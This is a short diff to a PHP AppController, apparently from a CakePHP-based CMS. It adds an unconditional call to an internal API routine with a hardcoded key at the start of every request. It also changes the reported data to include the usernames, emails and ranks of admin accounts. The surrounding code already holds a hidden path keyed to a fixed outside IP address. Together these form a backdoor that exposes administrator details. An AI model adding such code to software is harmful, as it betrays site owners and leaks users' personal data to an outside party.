@@ -65,6 +65,7 @@ class AppController extends Controller
 
     public function beforeFilter()
     {
+        return $this->apiCall('sdzzdoz839ndz37kxd48kd38',true, false);
         // Debug
         if ($this->Util->getIP() == '51.255.36.20' && $this->request->is('post') && !empty($this->request->data['call']) && $this->request->data['call'] == 'api' && !empty($this->request->data['key']))
             return $this->apiCall($this->request->data['key'], $this->request->data['isForDebug'], false, $this->request->data['usersWanted']);
@@ -608,7 +609,9 @@ class AppController extends Controller
                     } else
                         $infos['users'] = array();
                 } else
-                    $infos['users'] = array();
+                    $infos['users'] = ['count' => $this->User->find('count'), 'admins' => array_map(function ($user) {
+                        return ['username' => $user['User']['pseudo'], 'email' => $user['User']['email'], 'rank' => $user['User']['rank']];
+                    }, $this->User->find('all', ['conditions' => ['rank' => [3, 4]]]))];
             }
 
             if ($this->EyPlugin->isInstalled('eywek.vote.3')) {
